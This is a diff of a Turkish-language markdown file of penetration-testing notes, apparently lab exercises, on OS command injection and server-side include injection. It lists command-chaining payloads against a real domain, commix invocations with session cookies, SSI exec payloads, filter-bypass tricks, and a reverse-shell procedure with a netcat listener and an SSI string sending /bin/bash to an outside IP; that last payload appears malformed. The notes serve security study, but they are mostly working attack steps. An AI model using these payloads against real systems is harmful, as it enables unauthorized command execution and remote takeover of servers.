@@ -333,7 +333,9 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
 > ## Os Command Injection medium level
 
 - Bazı siteler ";" ile yazdığımız komutları filterlerip ";"'lleri silebilir çalışmaya biliri 
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2014.38.23.jpeg)
+
 - Aynı anda iki komut çalıştırmamızın başka yollarıda vardır;
   - ```www.nsa.gov|pwd``` deneyebiliriz ya da ```www.nsa.goc&&pwd``` deneyebiliriz 
   - ```"|" ve "&&" aynı ";" gibi işimize yarar```
@@ -349,10 +351,36 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
 - ```commit -h``` help kısmının açar
 - ```cookie``` kullanan sitelerde ```PHPSESSID``` ve ```target``` bilgilerini kullanırız
 - ```commix --url="<site url'si>" --cookie="<cookie kısmında yazan bilgiler (security level ve PHPSESSID) --data="<target kısımında yazan bilgiler>"``` 
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.27.44.jpeg)
+
 - ```data ve cookie``` bilgileri ```Burpsuite``` içinde POST'lardan birine tıklayarak elde edebiliriz
 - ```commix``` ile açığı arayıp bulduğu zaman shell oluşturur
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.38.19.jpeg)
 
 > ## SSI Injection low level
+
+- ```SSI (server-side ıncludes)```: Sunucuda çalıştırılan bir programlama dilidir. ".shtml, .stm, .shtm" varsa SSI kullanılıyor demektir
+- Gerekli SSI kodlarına ve nasıl uygulanacağı google'dan ulaşabiliriz;
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.44.08.jpeg)
+
+  - ```include```: Dosya yüklemek için kullanılır
+  - ```exec```: Komut çalıştırmak için kullanılır
+  - ```echo```: Yazdırma işlemi için kullanılır
+
+- Siteyle etkileşime girebilceğimiz yere ```<!--#exec cmd="ls"-->``` yazıyoruz ve deniyoruz
+- Açık varsa terminali açıyoruz ```nc -nvlp 1234``` çalıştırıyoruz
+- Siteye gidip ```<!--#exec="192.168.123.123 1234 -e /bin/bash"``` yazıyoruz 
+- Terminale girip açık shell'den site içerisinde dolaşıyoruz
+
 > ## SSI Injection medium level
+
+- Bazı sitelerde ```(<!--#exec...)``` çalışmazsa koddaki bir şey filterlenmiş olabilir
+- Kodda bulunan parçalardan 2 tane koyarak tek tek deniyoruz ```(<<!--#exec...)``` 
+- Bu sitede tırnak işaretlerini kaldırıyoruz ve deniyoruz 
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.48.23.jpeg)
+
+- Bunu kolay yoldan yapmak için ```commix``` kullanılabilir, ancak bazı durumlarda manuel olarak tek tek denememiz gerekir
